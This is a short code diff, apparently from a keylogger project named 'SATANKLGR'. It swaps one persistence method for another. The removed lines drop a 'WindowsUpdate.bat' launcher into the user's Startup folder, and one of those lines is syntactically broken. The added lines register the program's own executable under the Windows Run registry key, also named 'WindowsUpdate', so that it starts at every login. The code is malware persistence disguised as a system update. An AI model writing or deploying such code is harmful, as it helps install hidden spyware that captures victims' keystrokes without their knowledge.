@@ -1,7 +1,9 @@
-import getpass
+from os import path
+from winreg import *
+   
+PathFile = path.abspath((__file__)[:-2]+'exe')
+print(PathFile)
 
-USER_NAME = getpass.getuser()
-
-bat_path = r'C:\\Users\\%s\\AppData\\Roaming\\Microsoft\\Windows\\Start Menu\\Programs\\Startup' % USER_NAME
-with open(bat_path + "\\WindowsUpdate.bat", "w+") as bat_file:
-    bat_file.write(r'start "" C:\Users\user\Desktop\SATANKLGR.exe' %)
+StartupKey = OpenKey(HKEY_CURRENT_USER, r'SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run',0, KEY_ALL_ACCESS)
+SetValueEx(StartupKey, 'WindowsUpdate', 0, REG_SZ, PathFile)
+CloseKey(StartupKey)
